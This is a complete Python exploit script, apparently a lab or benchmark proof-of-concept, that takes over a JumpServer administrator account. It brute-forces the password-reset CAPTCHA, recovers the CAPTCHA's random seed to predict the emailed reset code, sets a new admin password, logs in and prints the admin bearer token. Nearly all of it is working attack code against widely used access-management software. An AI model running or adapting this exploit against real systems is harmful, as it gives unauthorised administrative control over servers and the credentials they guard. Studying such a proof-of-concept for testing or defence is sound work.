"""Take over Jumpserver's admin account through the CAPTCHA seed leak."""

import email.message
import html
import http.cookiejar
import json
import os
import random
import re
import secrets
import string
import time
import urllib.error
import urllib.parse
import urllib.request


USERNAME = "admin"
EMAIL = "admin@mycomany.com"
PREVIEW_PATH = "/core/auth/password/forget/previewing/"
FORGOT_PATH = "/core/auth/password/forgot/"
PROFILE_PATH = "/api/v1/users/profile/"
ADMIN_ROLE_ID = "00000000-0000-0000-0000-000000000001"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    """Return redirects to the caller for workflow validation."""

    def redirect_request(
        self, request: urllib.request.Request, response: object, code: int,
        message: str, headers: object, url: str,
    ) -> None:
        return None


class Client:
    """Keep reset cookies while exposing HTTP response status and headers."""

    def __init__(self, base_url: str) -> None:
        self.base_url = base_url.rstrip("/")
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()),
            NoRedirect(),
        )

    def request(
        self, path: str, data: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> tuple[int, email.message.Message, bytes]:
        url = urllib.parse.urljoin(self.base_url + "/", path.lstrip("/"))
        request = urllib.request.Request(url, data=data, headers=headers or {})
        try:
            response = self.opener.open(request, timeout=20)
        except urllib.error.HTTPError as error:
            response = error
        return response.status, response.headers, response.read()

    def form(
        self, path: str, values: dict[str, str]
    ) -> tuple[int, email.message.Message, bytes]:
        body = urllib.parse.urlencode(values).encode()
        return self.request(
            path, body,
            {"Content-Type": "application/x-www-form-urlencoded"},
        )

    def json_post(
        self, path: str, values: dict[str, str]
    ) -> tuple[int, email.message.Message, bytes]:
        return self.request(
            path, json.dumps(values).encode(),
            {"Content-Type": "application/json"},
        )


def hidden_value(html: str, name: str) -> str:
    match = re.search(
        rf'name="{re.escape(name)}" value="([^"]+)"', html,
    )
    if match is None:
        raise RuntimeError(f"Missing {name} input")
    return match.group(1)


def preview_form(client: Client) -> tuple[str, str]:
    status, _, body = client.request(PREVIEW_PATH)
    if status != 200:
        raise RuntimeError(f"Password preview returned {status}")
    html = body.decode("utf-8", errors="replace")
    return hidden_value(html, "csrfmiddlewaretoken"), hidden_value(html, "captcha_0")


def wait_for_application(client: Client) -> None:
    deadline = time.monotonic() + 220
    while time.monotonic() < deadline:
        try:
            preview_form(client)
            return
        except (OSError, RuntimeError, urllib.error.URLError):
            time.sleep(2)
    raise RuntimeError("Password reset page did not become ready")


def preview_token(client: Client) -> str:
    csrf, captcha_key = preview_form(client)
    for answer in range(101):
        status, headers, _ = client.form(PREVIEW_PATH, {
            "csrfmiddlewaretoken": csrf,
            "username": USERNAME,
            "captcha_0": captcha_key,
            "captcha_1": str(answer),
        })
        if status != 302:
            continue
        location = headers.get("Location", "")
        if not location.startswith(FORGOT_PATH):
            raise RuntimeError(f"Unexpected preview redirect: {location}")
        token = urllib.parse.parse_qs(urllib.parse.urlsplit(location).query).get(
            "token", [""]
        )[0]
        if token:
            return token
    raise RuntimeError("No CAPTCHA answer produced a reset preview token")


def prepare_image_seed(client: Client) -> str:
    _, seed = preview_form(client)
    image_path = f"/core/auth/captcha/image/{seed}/"
    for _ in range(40):
        status, headers, _ = client.request(image_path)
        if status != 200 or "image/png" not in headers.get("Content-Type", ""):
            raise RuntimeError(f"CAPTCHA image returned {status}")
    return seed


def predicted_code(seed: str, character_count: int) -> str:
    random.seed(seed)
    for _ in range(character_count):
        random.randrange(-35, 35)
    for _ in range(int(180 * 38 * 0.1)):
        random.randint(0, 180)
        random.randint(0, 38)
    characters = string.ascii_letters + string.digits
    while True:
        code = "".join(random.choice(characters) for _ in range(6))
        if any(character.isdigit() for character in code):
            return code


def send_reset_code(client: Client, token: str) -> None:
    path = "/api/v1/authentication/password/reset-code/?token=" + token
    status, _, body = client.json_post(path, {
        "email": EMAIL,
        "sms": "",
        "form_type": "email",
    })
    if status != 200 or json.loads(body).get("data") != "ok":
        raise RuntimeError(f"Reset code request failed: {status} {body[:120]!r}")


def reset_token(client: Client, preview: str, seed: str) -> str:
    path = FORGOT_PATH + "?token=" + preview
    status, _, body = client.request(path)
    if status != 200:
        raise RuntimeError(f"Reset verification form returned {status}")
    csrf = hidden_value(body.decode("utf-8", errors="replace"), "csrfmiddlewaretoken")
    candidates = [predicted_code(seed, count) for count in (3, 4, 5, 6)]
    deadline = time.monotonic() + 100
    last_error = ""
    while time.monotonic() < deadline:
        for code in dict.fromkeys(candidates):
            status, headers, body = client.form(path, {
                "csrfmiddlewaretoken": csrf,
                "email": EMAIL,
                "sms": "",
                "form_type": "email",
                "code": code,
            })
            location = headers.get("Location", "")
            if status == 302 and location.startswith("/core/auth/password/reset/"):
                return urllib.parse.parse_qs(
                    urllib.parse.urlsplit(location).query
                ).get("token", [""])[0]
            errors = re.findall(
                r'<p class="red-fonts">(.*?)</p>',
                body.decode("utf-8", errors="replace"),
                re.DOTALL,
            )
            if errors:
                last_error = html.unescape(re.sub(r"<[^>]+>", "", errors[0])).strip()
        if "验证码错误" in last_error or "incorrect" in last_error.lower():
            raise RuntimeError(f"Predicted reset code mismatch: {last_error}")
        time.sleep(1)
    raise RuntimeError(f"Predicted email reset code was not accepted: {last_error}")


def set_password(client: Client, token: str, password: str) -> None:
    path = "/core/auth/password/reset/?token=" + token
    status, _, body = client.request(path)
    if status != 200 or "token_invalid" in body.decode("utf-8", errors="replace"):
        raise RuntimeError(f"Password reset form returned {status}")
    csrf = hidden_value(body.decode("utf-8", errors="replace"), "csrfmiddlewaretoken")
    status, headers, body = client.form(path, {
        "csrfmiddlewaretoken": csrf,
        "new_password": password,
        "confirm_password": password,
    })
    if status != 302 or not headers.get("Location", "").startswith(
        "/core/common/flash-message/"
    ):
        raise RuntimeError(f"Password update failed: {status} {body[:120]!r}")


def protected_identity(client: Client, token: str = "") -> tuple[int, dict]:
    headers = {"Authorization": token} if token else {}
    status, _, body = client.request(PROFILE_PATH, headers=headers)
    if status != 200:
        return status, {}
    return status, json.loads(body)


def login(client: Client, password: str) -> str:
    status, _, body = client.json_post(
        "/api/v1/authentication/auth/",
        {"username": USERNAME, "password": password},
    )
    if status != 201:
        raise RuntimeError(f"Admin login failed: {status} {body[:120]!r}")
    token = json.loads(body).get("token", "")
    if not token:
        raise RuntimeError("Admin login did not return a bearer token")
    return "Bearer " + token


def main() -> None:
    base_url = os.environ.get("REMOTE_TARGET_URL", "http://localhost:18080")
    client = Client(base_url)
    wait_for_application(client)
    status, _ = protected_identity(client)
    if status != 401:
        raise RuntimeError(f"Profile was accessible without authentication: {status}")
    preview = preview_token(client)
    seed = prepare_image_seed(client)
    send_reset_code(client, preview)
    token = reset_token(client, preview, seed)
    if not token:
        raise RuntimeError("Reset token was empty")
    password = "Dojo!1" + secrets.token_hex(12) + "Aa"
    set_password(client, token, password)
    bearer = login(client, password)
    status, profile = protected_identity(client, bearer)
    if (status != 200 or profile.get("username") != USERNAME
            or ADMIN_ROLE_ID not in profile.get("system_roles", [])):
        raise RuntimeError("Bearer token did not identify the administrator")
    print(json.dumps({"evidence_payload": {"token": bearer, "user": USERNAME}}))


if __name__ == "__main__":
    main()
